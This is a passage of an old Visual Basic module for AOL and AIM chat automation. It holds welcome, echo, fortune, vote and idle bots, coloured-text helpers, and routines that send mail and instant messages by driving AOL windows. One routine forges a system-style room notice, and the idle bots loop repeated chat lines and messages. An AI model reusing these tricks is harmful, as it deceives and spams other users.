If (AoL4_LastChatLine) Like ("* has entered the room.*") Then GoTo meeh

meeh:
meeh2 = Len(AoL4_LastChatLine)
MeEh3 = meeh2 - 22
SN$ = Left$(AoL4_LastChatLine, MeEh3)
AoL4_ChatSend (B4 & SN$ & After)
End If
End Sub
Sub List_Load(dir, Lst As ListBox)
Dim strin As String
On Error Resume Next
Open dir For Input As #1
While Not EOF(1)
Input #1, strin$
DoEvents
Lst.AddItem strin$
Wend
Close #1
Exit Sub
End Sub

Sub List_Save(dir, Lst As ListBox)
Dim SaveList As Long
On Error Resume Next
Open dir For Output As #1
For SaveList& = 0 To Lst.ListCount - 1
Print #1, Lst.List(SaveList&)
Next SaveList&
Close #1
End Sub

Sub Text_Load(dir, Txt As TextBox)
Dim strin As String
On Error Resume Next
Open dir For Input As #1
While Not EOF(1)
Input #1, strin$
DoEvents
Txt.text = strin$
Wend
Close #1
Exit Sub
End Sub

Sub AoL3_BotWelcome(B4, After)
'ie: AoL3_BotWelcome ("· Sup Sup "), (" ·")
If (AoL3_SnFromLastChatLine) Like ("OnlineHost") Then
If (AoL3_LastChatLine) Like ("* has entered the room.*") Then GoTo meeh

meeh:
meeh2 = Len(AoL3_LastChatLine)
MeEh3 = meeh2 - 22
SN$ = Left$(AoL3_LastChatLine, MeEh3)
AoL3_ChatSend (B4 & SN$ & After)
End If
End Sub

Sub AoL4_BotEcho(ScreenName)
'You can use a textbox or just a screenname
'Ie: AoL4_BotEcho (txT)
'Whosever name you put in txT will be echoed
If AoL4_SNFromLastChatLine Like (ScreenName) Then
AoL4_ChatSend (AoL4_LastChatLine)
End If
End Sub

Sub AoL3_BotEcho(ScreenName)
'You can use a textbox or just a screen name
'Ie: AoL3_BotEcho (txT)
'Whosever name you put in txT will be echoed
If AoL3_SnFromLastChatLine Like (ScreenName) Then
AoL3_ChatSend (AoL3_LastChatLine)
End If
End Sub

Public Sub FortuneBot()
'ie
'1.) in Timer1 tye Call FortuneBot
'2.) make 2 command buttons

'3.) in command1_click type-
'Timer1.enbled = True
'AOLChatSend "Type: /Fortune to get your fortune"
'4.) in command2_click type-
'Timer1.enabled = false
'AOLChatSend "Fortune Bot is now Off!"
Timer1.interval = 1
On Error Resume Next
Dim last As String
Dim Name As String
Dim a As String
Dim n As Integer
Dim x As Integer
DoEvents
a = AoL4_LastChatLine
last = Len(a)
For x = 1 To last
Name = Mid(a, x, 1)
final = final & Name
If Name = ":" Then Exit For
Next x
final = Left(final, Len(final) - 1)
If final = AoL4_LastChatLine Then
Exit Sub
Else
If InStr(a, "/fortune") Then
Randomize
rand = Int((Rnd * 10) + 1)
If rand = 1 Then Call AoL4_ChatSend("" & final & ", You will win the lottery and spend it all on BEER!")
If rand = 2 Then Call AoL4_ChatSend("" & final & ", You will kill Steve Case and take over AoL!")
If rand = 3 Then Call AoL4_ChatSend("" & final & ", You will marry Carmen Electra!")
If rand = 4 Then Call AoL4_ChatSend("" & final & ", You will DL a PWS and get thousands of bucks charged on your account!")
If rand = 5 Then Call AoL4_ChatSend("" & final & ", You will end up werking at McDonalds and die a lonely man")
If rand = 6 Then Call AoL4_ChatSend("" & final & ", You will get a check for ONE MILLION $$ from me! Yeah right!")
If rand = 7 Then Call AoL4_ChatSend("" & final & ", You will be OWNED by shlep")
If rand = 8 Then Call AoL4_ChatSend("" & final & ", You will be OWNED by epa")
If rand = 9 Then Call AoL4_ChatSend("" & final & ", You will get an OH and delete Steve Case's SN!")
If rand = 10 Then Call AoL4_ChatSend("" & final & ", You will slip on a banana peel in Japan and land on some egg foo yung!")
Call Pause(0.6)
End If
End If
End Sub

Sub meeh_Ascii_Shop(List1 As ListBox, List2 As ListBox, Combo1 As ComboBox, Combo2 As ComboBox, Combo3 As ComboBox)
'Ie: Ascii_Shop (List1), (Combo2), (combo5), (Combo3), (Combo1)
'Combo1 = For Ascii Examples
'Combo2 = For Fonts
'Combo3 = For Colors
'List1 = For Ascii Characters
'List2 = For HTML Codes
'====================================================
'In Each of the Comboboxes_Click Put the
'Following:
'txT.text = txT.text + Combo1.text
'In Each Of The ListBoxes_MouseUp Put
'the Following:
'txT.text = txT.text + List1.text
For x = 1 To Screen.FontCount
Combo2.AddItem Screen.Fonts(x)
Next
Combo2.AddItem Str$(x)
Combo2.RemoveItem Screen.FontCount
List1.AddItem "!"
List1.AddItem """"
List1.AddItem "#"
List1.AddItem "$"
List1.AddItem "%"
List1.AddItem "&"
List1.AddItem "'"
List1.AddItem "("
List1.AddItem ")"
List1.AddItem "*"
List1.AddItem "+"
List1.AddItem ","
List1.AddItem "-"
List1.AddItem "."
List1.AddItem "/"
List1.AddItem ":"
List1.AddItem ";"
List1.AddItem "<"
List1.AddItem "="
List1.AddItem ">"
List1.AddItem "?"
List1.AddItem "@"
List1.AddItem "["
List1.AddItem "\"
List1.AddItem "]"
List1.AddItem "^"
List1.AddItem "_"
List1.AddItem "`"
List1.AddItem "{"
List1.AddItem "|"
List1.AddItem "}"
List1.AddItem "~"
List1.AddItem ""
List1.AddItem "‚"
List1.AddItem "ƒ"
List1.AddItem "„"
List1.AddItem "…"
List1.AddItem "†"
List1.AddItem "‡"
List1.AddItem "ˆ"
List1.AddItem "‰"
List1.AddItem "Š"
List1.AddItem "‹"
List1.AddItem "Œ"
List1.AddItem "‘"
List1.AddItem "’"
List1.AddItem "“"
List1.AddItem "”"
List1.AddItem "•"
List1.AddItem "–"
List1.AddItem "—"
List1.AddItem "˜"
List1.AddItem "™"
List1.AddItem "š"
List1.AddItem "›"
List1.AddItem "œ"
List1.AddItem "Ÿ"
List1.AddItem " "
List1.AddItem "¡"
List1.AddItem "¢"
List1.AddItem "£"
List1.AddItem "¤"
List1.AddItem "¥"
List1.AddItem "¦"
List1.AddItem "§"
List1.AddItem "¨"
List1.AddItem "©"
List1.AddItem "ª"
List1.AddItem "«"
List1.AddItem "¬"
List1.AddItem "­"
List1.AddItem "®"
List1.AddItem "¯"
List1.AddItem "°"
List1.AddItem "±"
List1.AddItem "²"
List1.AddItem "³"
List1.AddItem "´"
List1.AddItem "µ"
List1.AddItem "¶"
List1.AddItem "·"
List1.AddItem "¸"
List1.AddItem "¹"
List1.AddItem "º"
List1.AddItem "»"
List1.AddItem "¼"
List1.AddItem "½"
List1.AddItem "¾"
List1.AddItem "¿"
List1.AddItem "À"
List1.AddItem "Á"
List1.AddItem "Â"
List1.AddItem "Ã"
List1.AddItem "Ä"
List1.AddItem "Å"
List1.AddItem "Æ"
List1.AddItem "Ç"
List1.AddItem "È"
List1.AddItem "É"
List1.AddItem "Ê"
List1.AddItem "Ë"
List1.AddItem "Ì"
List1.AddItem "Í"
List1.AddItem "Î"
List1.AddItem "Ï"
List1.AddItem "Ð"
List1.AddItem "Ñ"
List1.AddItem "Ò"
List1.AddItem "Ó"
List1.AddItem "Ô"
List1.AddItem "Õ"
List1.AddItem "Ö"
List1.AddItem "×"
List1.AddItem "Ø"
List1.AddItem "Ù"
List1.AddItem "Ú"
List1.AddItem "Û"
List1.AddItem "Ü"
List1.AddItem "Ý"
List1.AddItem "Þ"
List1.AddItem "ß"
List1.AddItem "à"
List1.AddItem "á"
List1.AddItem "â"
List1.AddItem "ã"
List1.AddItem "ä"
List1.AddItem "å"
List1.AddItem "æ"
List1.AddItem "ç"
List1.AddItem "è"
List1.AddItem "é"
List1.AddItem "ê"
List1.AddItem "ë"
List1.AddItem "ì"
List1.AddItem "í"
List1.AddItem "î"
List1.AddItem "ï"
List1.AddItem "ð"
List1.AddItem "ñ"
List1.AddItem "ò"
List1.AddItem "ó"
List1.AddItem "ô"
List1.AddItem "õ"
List1.AddItem "ö"
List1.AddItem "÷"
List1.AddItem "ø"
List1.AddItem "ù"
List1.AddItem "ú"
List1.AddItem "û"
List1.AddItem "ü"
List1.AddItem "ý"
List2.AddItem "<Sub>"
List2.AddItem "</Sub>"
List2.AddItem "<Sup>"
List2.AddItem "</Sup>"
List2.AddItem "<Html>"
List2.AddItem "</Html"
List2.AddItem "<Pre>"
List2.AddItem "</Pre>"
List2.AddItem "<br>"
List2.AddItem "<S>"
List2.AddItem "</S>"
List2.AddItem "<h1>"
List2.AddItem "</H1>"
List2.AddItem "<H2>"
List2.AddItem "</H2>"
List2.AddItem "<H3>"
List2.AddItem "</H3>"
List2.AddItem "<B>"
List2.AddItem "</B>"
List2.AddItem "<I>"
List2.AddItem "</I>"
List2.AddItem "<U>"
List2.AddItem "</U>"
Combo3.AddItem "Red"
Combo3.AddItem "Orange"
Combo3.AddItem "Black"
Combo3.AddItem "Green"
Combo3.AddItem "Brown"
Combo3.AddItem "Grey"
Combo3.AddItem "Yellow"
Combo3.AddItem "Blue"
Combo3.AddItem "Pink"
Combo3.AddItem "White"
Combo3.AddItem "Purple"
Combo3.AddItem "Maroon"
Combo3.AddItem "D Red"
Combo3.AddItem "D Blue"
Combo3.AddItem "D Green"
Combo3.AddItem "D Pink"
Combo3.AddItem "D Purple"
Combo3.AddItem "D Grey"
Combo3.AddItem "D Orange"
Combo3.AddItem "L Red"
Combo3.AddItem "L Blue"
Combo3.AddItem "L Green"
Combo3.AddItem "L Pink"
Combo3.AddItem "L Purple"
Combo3.AddItem "L Grey"
Combo3.AddItem "L Orange"
Combo1.AddItem "‹v^•"
Combo1.AddItem "•^v›"
Combo1.AddItem "•`•¤"
Combo1.AddItem "¤•´•"
Combo1.AddItem "]•¤"
Combo1.AddItem "¤•["
Combo1.AddItem "`.·ìÌìÌì"
Combo1.AddItem "íÍíÍí·.´"
Combo1.AddItem "‹(`·"
Combo1.AddItem "·´)›"
Combo1.AddItem "‹Ì›"
Combo1.AddItem "‹Í›"
Combo1.AddItem "`x.¸"
Combo1.AddItem "‹«‹¦›»›"
Combo1.AddItem "‹í¡í›"
Combo1.AddItem "‹íÍí›"
Combo1.AddItem "‹íÏì›"
Combo1.AddItem "‹íÍí›"
Combo1.AddItem "‹íÍì›"
Combo1.AddItem ".`·`. `"
Combo1.AddItem "´ .´·´."
Combo1.AddItem "‹v(·`. "
Combo1.AddItem " .´·)v›"
Combo1.AddItem "`·`.ÌìÌì• "
Combo1.AddItem " •íÍíÍ.´·´"
Combo1.AddItem "•¤•"
Combo1.AddItem "¤•¤"
End Sub

Sub AoL4_BotIdle(Lst As ListBox)
Do
DoEvents
AoL4_ChatSend ("Idle " & List_Count(Lst) & " Minutes")
TimeOut 50#
AoL4_ImSend (Time), (Lst.ListCount)
TimeOut 50#
Lst.AddItem Time
Lst.AddItem Time
AoL4_ImSend (Time), (Lst.ListCount)
TimeOut 50#
AoL4_ChatSend ("Idle " & List_Count(Lst) & " Minutes")
Lst.AddItem Time
TimeOut 50#
AoL4_ImSend (Time), (Lst.ListCount)
TimeOut 50#
Lst.AddItem Time
AoL4_ImSend (Time), (Lst.ListCount)
TimeOut 50#
Loop
End Sub

Sub AoL3_BotIdle(Lst As ListBox)
Do
DoEvents
AoL3_ChatSend ("Idle " & List_Count(Lst) & " Minutes")
TimeOut 50#
AoL3_ImSend (Time), (Lst.ListCount)
TimeOut 50#
Lst.AddItem Time
Lst.AddItem Time
AoL3_ImSend (Time), (Lst.ListCount)
TimeOut 50#
AoL3_ChatSend ("Idle " & List_Count(Lst) & " Minutes")
Lst.AddItem Time
TimeOut 50#
AoL3_ImSend (Time), (Lst.ListCount)
TimeOut 50#
Lst.AddItem Time
AoL3_ImSend (Time), (Lst.ListCount)
TimeOut 50#
Loop
End Sub

Sub AoL3_BotVote(Cmb As CommandButton, Txt As TextBox, List As ListBox, Lst As ListBox)
'Ie: AoL3_BotVote (command1), (txT), (list1), (list2)
'command1 is a stop button
'txT is where the question to vote on goes
'list1 is for votes for yes
'list2 is for votes for no
If AoL3_SnFromLastChatLine Like aol3_usersn Then
Exit Sub
End If
AoL3_ChatSend ("Vote ""Yes"" For Yes And ""No"" For No")
TimeOut 0.099
AoL3_ChatSend (Txt)
If AoL3_LastChatLine Like LCase("Yes") Then
List.AddItem AoL3_SnFromLastChatLine
AoL3_ChatSend (AoL3_SnFromLastChatLine & " Your Vote Was Recorded")
End If
If AoL3_LastChatLine Like LCase("No") Then
Lst.AddItem AoL3_SnFromLastChatLine
AoL3_ChatSend (AoL3_SnFromLastChatLine & " Your Vote Was Recorded")
End If
If Cmb_click Then
AoL3_ChatSend ("There have been " & List.ListCount & " Votes For Yes")
TimeOut 0.099
AoL3_ChatSend ("And there have been " & Lst.ListCount & " Votes For No")
End If
End Sub

Sub AoL4_BotVote(Cmb As CommandButton, Txt As TextBox, List As ListBox, Lst As ListBox)
'Ie: AoL4_BotVote (command1), (txT), (list1), (list2)
'command1 is a stop button
'txT is where the question to vote on goes
'list1 is for votes for yes
'list2 is for votes for no
If AoL4_SNFromLastChatLine Like AoL4_UserSn Then
Exit Sub
End If
AoL4_ChatSend ("Vote ""Yes"" For Yes And ""No"" For No")
TimeOut 0.099
AoL4_ChatSend (Txt)
If AoL4_LastChatLine Like LCase("Yes") Then
List.AddItem AoL4_SNFromLastChatLine
AoL4_ChatSend (AoL4_SNFromLastChatLine & " Your Vote Was Recorded")
End If
If AoL4_LastChatLine Like LCase("No") Then
Lst.AddItem AoL4_SNFromLastChatLine
AoL4_ChatSend (AoL4_SNFromLastChatLine & " Your Vote Was Recorded")
End If
If Cmb_click Then
AoL4_ChatSend ("There have been " & List.ListCount & " Votes For Yes")
TimeOut 0.099
AoL4_ChatSend ("And there have been " & Lst.ListCount & " Votes For No")
End If
End Sub

Sub List_Remove(Lst As ListBox, item)
'Ie1:list_remove (List1), ("Jack")
'Ie2:list_remove (List1), (5)
Lst.RemoveItem (item)
End Sub

Sub List_RemoveOnClick(Lst As ListBox)
Lst.RemoveItem Lst.SelCount
End Sub

Sub AoL4_StayOnline()
Do
a% = FindWindow("_Aol_Palette", 0&)
b% = FindIt(a%, "_Aol_Icon")
Call TimeOut(0.001)
Loop Until b% <> 0
Click (b%)
End Sub

Sub AoL4_ChatSendBold(Txt)
'Sends the text bold
AoL4_ChatSend ("<b>" & Txt & "</b>")
End Sub

Sub AoL4_ChatSendItalic(Txt)
'Sends the text italicized
AoL4_ChatSend ("<I>" & Txt & "</I>")
End Sub

Sub AoL4_ChatSendUline(Txt)
'Sends the text underlined
AoL4_ChatSend ("<U>" & Txt & "</U>")
End Sub

Sub AoL4_ChatSendSThrough(Txt)
'Sends the text underlined
AoL4_ChatSend ("<S>" & Txt & "</S>")
End Sub

Sub AoL4_ChatSendBlue(Txt)
'Sends the text blue
AoL4_ChatSend ("<font face=""Abadi MT Condensed""><Font Color=""#0000AA"">" & Txt)
End Sub

Sub AoL4_ChatSendLBlue(Txt)
'Sends the text light blue
AoL4_ChatSend ("<Font Color=""#0066FF"">" & Txt)
End Sub

Sub AoL4_ChatSendRed(Txt)
'Sends the text red
AoL4_ChatSend ("<Font Color=""#CC0000"">" & Txt)
End Sub

Sub AoL4_ChatSendLRed(Txt)
'Sends the text light red
AoL4_ChatSend ("<Font Color=""#FF0000"">" & Txt)
End Sub

Sub AoL4_ChatSendDBlue(Txt)
'Sends the text dark blue
AoL4_ChatSend ("<Font Color=""#000066"">" & Txt)
End Sub

Sub AoL4_ChatSendDRed(Txt)
'Sends the text dark red
AoL4_ChatSend ("<Font Face=""Abadi MT Condensed""><Font Color=""#990000"">" & Txt)
End Sub

Sub AoL4_ChatSendGreen(Txt)
'Sends the text green
AoL4_ChatSend ("<Font Color=""#007700"">" & Txt)
End Sub

Sub AoL4_ChatSendLGreen(Txt)
'Sends the text light green
AoL4_ChatSend ("<Font Color=""#00CC00"">" & Txt)
End Sub

Sub AoL4_ChatSendDGreen(Txt)
'Sends the text dark green
AoL4_ChatSend ("<Font Face=""Abadi MT Condensed""><Font Color=""#005500"">" & Txt)
End Sub

Sub AoL4_ChatSendBlack(Txt)
'Sends the text black
AoL4_ChatSend ("<Font Color=""#000000"">" & Txt)
End Sub

Sub AoL4_ChatSendYellow(Txt)
'Sends the text yellow
AoL4_ChatSend ("<Font Color=""#CCFF00"">" & Txt)
End Sub

Sub AoL4_ChatSendBrown(Txt)
'Sends the text brown
AoL4_ChatSend ("<Font Color=""#996600"">" & Txt)
End Sub

Sub AoL4_ChatSendPurple(Txt)
'Sends the text purple
AoL4_ChatSend ("<Font Color=""#CC33CC"">" & Txt)
End Sub

Sub AoL4_ChatSendLPurple(Txt)
'Sends the text light purple
AoL4_ChatSend ("<Font Color=""#CC66FF"">" & Txt)
End Sub

Sub AoL4_ChatSendDPurple(Txt)
'Sends the text dark purple
AoL4_ChatSend ("<Font Color=""#990099"">" & Txt)
End Sub

Sub AoL4_ChatSendLLBlue(Txt)
'Sends the text light light blue
AoL4_ChatSend ("<Font Color=""#33CCFF"">" & Txt)
End Sub

Sub AoL4_ChatSendOrange(Txt)
'Sends the text orange
AoL4_ChatSend ("<Font Color=""#FF9900"">" & Txt)
End Sub

Sub AoL4_ChatSendLOrange(Txt)
'Sends the text light orange
AoL4_ChatSend ("<Font Color=""#FFCC00"">" & Txt)
End Sub

Sub AoL4_ChatSendDOrange(Txt)
'Sends the text dark orange
AoL4_ChatSend ("<Font Color=""#FF6600"">" & Txt)
End Sub

Sub AoL4_ChatSendPink(Txt)
'Sends the text pink
AoL4_ChatSend ("<Font Color=""#FF66FF"">" & Txt)
End Sub

Sub AoL4_ChatSendLPink(Txt)
'Sends the text light pink
AoL4_ChatSend ("<Font Color=""#FFCCFF"">" & Txt)
End Sub

Sub AoL4_ChatSendDPink(Txt)
'Sends the text dark pink
AoL4_ChatSend ("<Font Color=""#FF00FF"">" & Txt)
End Sub

Sub AoL4_ChatSendGrey(Txt)
'Sends the text grey
AoL4_ChatSend ("<Font Color=""#999999"">" & Txt)
End Sub

Sub AoL4_ChatSendLGrey(Txt)
'Sends the text light grey
AoL4_ChatSend ("<Font Color=""#BBBBBB"">" & Txt)
End Sub

Sub AoL4_ChatSendDGrey(Txt)
'Sends the text dark grey
AoL4_ChatSend ("<Font Color=""#555555"">" & Txt)
End Sub
Sub AiM_ChatSendBold(Txt)
'Sends the text bold
AiM_ChatSend ("<b>" & Txt & "</b>")
End Sub

Sub AiM_ChatSendItalic(Txt)
'Sends the text italicized
AiM_ChatSend ("<I>" & Txt & "</I>")
End Sub

Sub AiM_ChatSendUline(Txt)
'Sends the text underlined
AiM_ChatSend ("<U>" & Txt & "</U>")
End Sub

Sub AiM_ChatSendSThrough(Txt)
'Sends the text underlined
AiM_ChatSend ("<S>" & Txt & "</S>")
End Sub

Sub AiM_ChatSendBlue(Txt)
'Sends the text blue
AiM_ChatSend ("<Font Color=""#0000AA"">" & Txt)
End Sub

Sub AiM_ChatSendLBlue(Txt)
'Sends the text light blue
AiM_ChatSend ("<Font Color=""#0066FF"">" & Txt)
End Sub

Sub AiM_ChatSendRed(Txt)
'Sends the text red
AiM_ChatSend ("<Font Color=""#CC0000"">" & Txt)
End Sub

Sub AiM_ChatSendLRed(Txt)
'Sends the text light red
AiM_ChatSend ("<Font Color=""#FF0000"">" & Txt)
End Sub

Sub AiM_ChatSendDBlue(Txt)
'Sends the text dark blue
AiM_ChatSend ("<Font Color=""#000066"">" & Txt)
End Sub

Sub AiM_ChatSendDRed(Txt)
'Sends the text dark red
AiM_ChatSend ("<Font Color=""#990000"">" & Txt)
End Sub

Sub AiM_ChatSendGreen(Txt)
'Sends the text green
AiM_ChatSend ("<Font Color=""#007700"">" & Txt)
End Sub

Sub AiM_ChatSendLGreen(Txt)
'Sends the text light green
AiM_ChatSend ("<Font Color=""#00CC00"">" & Txt)
End Sub

Sub AiM_ChatSendDGreen(Txt)
'Sends the text dark green
AiM_ChatSend ("<Font Color=""#005500"">" & Txt)
End Sub

Sub AiM_ChatSendBlack(Txt)
'Sends the text black
AiM_ChatSend ("<Font Color=""#000000"">" & Txt)
End Sub

Sub AiM_ChatSendYellow(Txt)
'Sends the text yellow
AiM_ChatSend ("<Font Color=""#CCFF00"">" & Txt)
End Sub

Sub AiM_ChatSendBrown(Txt)
'Sends the text brown
AiM_ChatSend ("<Font Color=""#996600"">" & Txt)
End Sub

Sub AiM_ChatSendPurple(Txt)
'Sends the text purple
AiM_ChatSend ("<Font Color=""#CC33CC"">" & Txt)
End Sub

Sub AiM_ChatSendLPurple(Txt)
'Sends the text light purple
AiM_ChatSend ("<Font Color=""#CC66FF"">" & Txt)
End Sub

Sub AiM_ChatSendDPurple(Txt)
'Sends the text dark purple
AiM_ChatSend ("<Font Color=""#990099"">" & Txt)
End Sub

Sub AiM_ChatSendLLBlue(Txt)
'Sends the text light light blue
AiM_ChatSend ("<Font Color=""#33CCFF"">" & Txt)
End Sub

Sub AiM_ChatSendOrange(Txt)
'Sends the text orange
AiM_ChatSend ("<Font Color=""#FF9900"">" & Txt)
End Sub

Sub AiM_ChatSendLOrange(Txt)
'Sends the text light orange
AiM_ChatSend ("<Font Color=""#FFCC00"">" & Txt)
End Sub

Sub AiM_ChatSendDOrange(Txt)
'Sends the text dark orange
AiM_ChatSend ("<Font Color=""#FF6600"">" & Txt)
End Sub

Sub AiM_ChatSendPink(Txt)
'Sends the text pink
AiM_ChatSend ("<Font Color=""#FF66FF"">" & Txt)
End Sub

Sub AiM_ChatSendLPink(Txt)
'Sends the text light pink
AiM_ChatSend ("<Font Color=""#FFCCFF"">" & Txt)
End Sub

Sub AiM_ChatSendDPink(Txt)
'Sends the text dark pink
AiM_ChatSend ("<Font Color=""#FF00FF"">" & Txt)
End Sub

Sub AiM_ChatSendGrey(Txt)
'Sends the text grey
AiM_ChatSend ("<Font Color=""#999999"">" & Txt)
End Sub

Sub AiM_ChatSendLGrey(Txt)
'Sends the text light grey
AiM_ChatSend ("<Font Color=""#BBBBBB"">" & Txt)
End Sub

Sub AiM_ChatSendDGrey(Txt)
'Sends the text dark grey
AiM_ChatSend ("<Font Color=""#555555"">" & Txt)
End Sub
Sub AoL4_RoomName(Name)
'Clears the chat room and then makes the name you
'give like the online host would do
'Ie: AoL4_RoomName ("LCase gods")
'and it would look like:
'
'
'*** You are in "LCase gods". ***
'
'In the chat room...
For i = 1 To 2
a = a + ""
Next
AoL4_ChatSend "<FONT COLOR=#FFFFF0><p=" & a
TimeOut 0.2
AoL4_ChatSend "<FONT COLOR=#FFFFF0><p=" & a
TimeOut 0.5
AoL4_ChatSend "<FONT COLOR=#FFFFF0><p=" & a
TimeOut 0.2
AoL4_ChatSend "</html></font>  *** You are in """ & (Name) & """. ***  "
End Sub

Sub AoL4_ChatItalic()
'Original Code By Numb
'It was only altered for my bas, by meeh
Room% = AOL4_FindRoom()
boL% = FindIt(Room%, "_AOL_Icon")
boL% = GetWindow(boL%, GW_HWNDNEXT)
boL% = GetWindow(boL%, GW_HWNDNEXT)
Clic% = SendMessage(boL%, WM_LBUTTONDOWN, 0, 0&)
Clic% = SendMessage(boL%, WM_LBUTTONUP, 0, 0&)
End Sub

Sub AoL4_ChatBold()
'Original Code By Numb
'It was only altered for my bas, by meeh
Room% = AOL4_FindRoom()
boL% = FindIt(Room%, "_AOL_Icon")
boL% = GetWindow(boL%, GW_HWNDNEXT)
Clic% = SendMessage(boL%, WM_LBUTTONDOWN, 0, 0&)
Clic% = SendMessage(boL%, WM_LBUTTONUP, 0, 0&)
End Sub

Sub AoL4_ChatUnderline()
'Original Code By Numb
'It was only altered for my bas, by meeh
Room% = AOL4_FindRoom()
boL% = FindIt(Room%, "_AOL_Icon")
boL% = GetWindow(boL%, GW_HWNDNEXT)
boL% = GetWindow(boL%, GW_HWNDNEXT)
boL% = GetWindow(boL%, GW_HWNDNEXT)
Clic% = SendMessage(boL%, WM_LBUTTONDOWN, 0, 0&)
Clic% = SendMessage(boL%, WM_LBUTTONUP, 0, 0&)
End Sub

Function AoL4_StayOnline2()
HwndZ% = FindWindow("_AOL_Palette", "America Online")
Childhwnd% = FindItsTitle(HwndZ%, "OK")
Click (Childhwnd%)
End Function

Sub Click(Button%)
SendNow% = SenditbyNum(Button%, WM_LBUTTONDOWN, &HD, 0)
SendNow% = SenditbyNum(Button%, WM_LBUTTONUP, &HD, 0)
End Sub
Sub ClickIcon(Button%)
SendNow% = SenditbyNum(Button%, WM_LBUTTONDOWN, &HD, 0)
SendNow% = SenditbyNum(Button%, WM_LBUTTONUP, &HD, 0)
End Sub
Sub AoL4_MailOpen()
AOL% = FindWindow("AOL Frame25", vbNullString)
Toolbar% = FindIt(AOL%, "AOL Toolbar")
ToolBarChild% = FindIt(Toolbar%, "_AOL_Toolbar")
TooLBaRB% = FindIt(ToolBarChild%, "_AOL_Icon")
TooLBaRB% = GetWindow(TooLBaRB%, 2)
Click TooLBaRB%
End Sub
Sub AoL3_MailOpen()
AOL% = FindWindow("AOL Frame25", vbNullString)
Call SendKeys("^m")
If AOL% = 0 Then
Exit Sub
End If
End Sub
Function Send_1(Key As String)
'This is for if you want to send Control M,
'or something in your program (SendKeys basicaly)
SendKeys ("^" & Key)
End Function
Function Send_2(Key As String)
'This is for if you want to send Alt SS,
'or something in your program (SendKeys basicaly)
SendKeys ("%" & Key)
End Function
Function AoL4_Windo()
AOL% = FindWindow("AOL Frame25", vbNullString)
AoL4_Win = AOL%
End Function
Function AoL4_Child()
AOL% = FindWindow("AOL Frame25", vbNullString)
AoL4_Child = FindIt(AOL%, "MDIClient")
End Function

Sub AoL4_MailOpenBox()
Do
AOL% = FindWindow("AOL Frame25", vbNullString)
Toolbar% = FindIt(AOL%, "AOL Toolbar")
ToolBarChild% = FindIt(Toolbar%, "_AOL_Toolbar")
ToolBarNow% = FindIt(ToolBarChild%, "_AOL_Icon")
Click ToolBarNow%
MDI% = FindIt(AOL%, "MDIClient")
AOL% = FindWindow("AOL Frame25", vbNullString)
AOLMD% = FindIt(AOL%, "MDIClient")
mail% = FindIt(AOLMD%, "AOL Child")
mail% = FindIt(mail%, "_AOL_TabControl")
dsa% = FindIt(mail%, "_AOL_TabPage")
it% = FindIt(dsa%, "_AOL_Tree")
If it% <> 0 Then Exit Sub
Loop
End Sub

Sub AoL4_MailSend(SN, Subject, Message)
meeh% = FindIt(AoL4_Windo(), "AOL Toolbar")
Toolbar% = FindIt(meeh%, "_AOL_Toolbar")
Receive% = FindIt(Toolbar%, "_AOL_Icon")
Receive% = GetWindow(Receive%, GW_HWNDNEXT)
Call Click(Receive%)
Do: DoEvents
mail% = FindItsTitle(AoL4_Child(), "Write Mail")
edit% = FindIt(mail%, "_AOL_Edit")
Rich% = FindIt(mail%, "RICHCNTL")
Receive% = FindIt(mail%, "_AOL_ICON")
Loop Until mail% <> 0 And edit% <> 0 And Rich% <> 0 And Receive% <> 0
Call SenditByString(edit%, WM_SETTEXT, 0, SN)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
Call SenditByString(edit%, WM_SETTEXT, 0, Subject)
Call SenditByString(Rich%, WM_SETTEXT, 0, Message)
For GetIcon = 1 To 18
Receive% = GetWindow(Receive%, GW_HWNDNEXT)
Next GetIcon
Call Click(Receive%)
End Sub

Function AoL4_RoomCountbyNum()
Dim Chat%
Chat% = AoL4_FindChatRoom()
List% = FindIt(Chat%, "_AOL_Listbox")
Count% = SendMessage(List%, LB_GETCOUNT, 0, 0)
AoL4_RoomCountbyNum = Count%
End Function
Sub AoL4_ImsOn()
AoL4_ImSend ("$Im_On"), ("Ims On!")
End Sub
Sub AoL4_ImsOff()
AoL4_ImSend ("$Im_Off"), ("Ims Off!")
End Sub
Sub AoL4_ImSend(Recipiant, Message)
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindIt(AOL%, "MDIClient")
Call AOL4_Keyword("im")
Do: DoEvents
IMWin% = FindItsTitle(MDI%, "Send Instant Message")
AOedit% = FindIt(IMWin%, "_AOL_Edit")
AORich% = FindIt(IMWin%, "RICHCNTL")
AOIcon% = FindIt(IMWin%, "_AOL_Icon")
Loop Until AOedit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Call SenditByString(AOedit%, WM_SETTEXT, 0, Recipiant)
Call SenditByString(AORich%, WM_SETTEXT, 0, Message)
For x = 1 To 9
    AOIcon% = GetWindow(AOIcon%, 2)
Next x
Call TimeOut(0.01)
Click (AOIcon%)
Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindIt(AOL%, "MDIClient")
IMWin% = FindItsTitle(MDI%, "Send Instant Message")
OkWin% = FindWindow("#32770", "America Online")
If OkWin% <> 0 Then Call SendMessage(OkWin%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMWin%, WM_CLOSE, 0, 0): Exit Do
If IMWin% = 0 Then Exit Do
Loop
End Sub
Sub AoL4_SendIm(Recipiant, Message)
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindIt(AOL%, "MDIClient")
Call AOL4_Keyword("im")
Do: DoEvents
IMWin% = FindItsTitle(MDI%, "Send Instant Message")
AOedit% = FindIt(IMWin%, "_AOL_Edit")
AORich% = FindIt(IMWin%, "RICHCNTL")
AOIcon% = FindIt(IMWin%, "_AOL_Icon")
Loop Until AOedit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Call SenditByString(AOedit%, WM_SETTEXT, 0, Recipiant)
Call SenditByString(AORich%, WM_SETTEXT, 0, Message)
For x = 1 To 9
    AOIcon% = GetWindow(AOIcon%, 2)
Next x
Call TimeOut(0.01)
Click (AOIcon%)
Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindIt(AOL%, "MDIClient")
IMWin% = FindItsTitle(MDI%, "Send Instant Message")
OkWin% = FindWindow("#32770", "America Online")
